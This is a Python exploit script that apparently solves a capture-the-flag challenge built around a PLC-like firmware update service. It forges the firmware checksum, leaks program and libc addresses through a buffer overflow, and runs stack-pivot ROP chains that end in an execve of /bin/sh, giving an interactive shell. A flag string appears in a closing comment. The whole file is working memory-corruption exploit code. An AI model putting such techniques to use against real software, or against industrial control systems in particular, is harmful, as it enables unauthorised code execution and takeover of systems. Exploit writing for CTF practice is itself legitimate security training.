import interact
from struct import * 

pivot = 0xf12
main = 0x130b
plc_main = 0x11ac

pop_rdi =  0x00000000000013b3 #  : pop rdi ; ret 
puts = 0x8d0
exit = 0x950

system = 0x045390
binsh = 0x18cd57
xor_rax = 0x000000000008b8c5# : xor rax, rax ; ret
pop_rax = 0x33544 #  : pop rax ; ret
syscall = 0xbc375 # : syscall ; ret
magic = 0x45216

pop_rdx_rsi = 0x1150c9 # : pop rdx ; pop rsi ; ret
    
def run_payload(ops):
    p.sendline("U")
    payload = "FWXX" + ops
    payload = payload.ljust(0x400, "\x00")
    payload = payload[0:0x400]
    p.sendline(payload)
    
    p.readuntil("ACTUAL FW CHECKSUM: ")
    checksum = int(p.recv(4), 16)
    print "checksum 0x{:x}".format(checksum)
    p.sendline("U")
    payload = "FW" + pack('H', checksum) + ops
    payload = payload.ljust(0x400, "\x00")
    payload = payload[0:0x400]
    p.sendline(payload)
    
    p.readuntil("SUCCESSFUL!")
    p.sendline("E")
    
    
def set_debug():
    print p.readuntil("Protocol")
    p.sendline("U")
    payload = "FW\x42\x5999819"
    payload = payload.ljust(0x400, "\x00")
    p.sendline(payload)
    
    print p.readuntil("SUCCESSFUL!")
    p.sendline("E")
    print p.readuntil("RUNNING")
    print "Done debug"


def exploit():

    set_debug()

    overwrite = ""
    ops = "998130" + "2A"*68 + overwrite + "9"
    run_payload(ops)

    print p.readuntil("RUNNING")
    p.sendline("S")
    print p.readuntil("A"*68)
    leak = p.readuntil("\n  ")[:-3]
    leak = leak.ljust(8, "\x00")[0:8]
    print leak.encode("hex")
    leak = unpack("Q", leak)[0]
    base = leak - 0xab0
    print "pie", hex(base)

    pp = lambda x: pack("Q", base + x)


    rip = pp(pivot)

    mat = ""
    for c in rip:
        mat += "2" + c

    ops = "998131" + "2A"*68 + mat + "7"*70 + "9"
    run_payload(ops)

    p.readuntil("OP 39\n")

    rop = [
    	pp(pop_rdi),
    	pp(0x202018),
    	pp(puts),
    	pp(plc_main)
    ]

    rop = "".join(rop)
    payload = "A" * 912 + rop
    payload = payload.ljust(0x400, "\x00")
    p.send(payload)

    libc_leak = unpack("Q", p.read(6).ljust(8, "\x00"))[0]
    libc_base = libc_leak - 0x06f690
    print "libc_base", hex(libc_base)

    lp = lambda x: pack("Q", libc_base + x)
    p64 = lambda x: pack("Q", x)

    import time
    time.sleep(2)
    print "restarting"
    p.sendline("S")
    p.sendline("S")
    p.readuntil("STATUS")

    rip = pp(pivot)

    mat = ""
    for c in rip:
        mat += "2" + c

    ops = "998131" + "2A"*68 + mat + "7"*70 + "9"
    run_payload(ops)
    p.readuntil("OP 39\n")

    rop = [
    	lp(pop_rax), p64(0x3B),
    	pp(pop_rdi), lp(binsh),
    	lp(pop_rdx_rsi), p64(0),p64(0),
    	lp(syscall),
    	pp(exit)
    ]

    rop = "".join(rop)
    payload = "A" * 912 + rop
    payload = payload.ljust(0x400, "\x00")
    p.send(payload)

    p.interactive()

    # flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}

if __name__ == "__main__":
    p = interact.Process()

    exploit()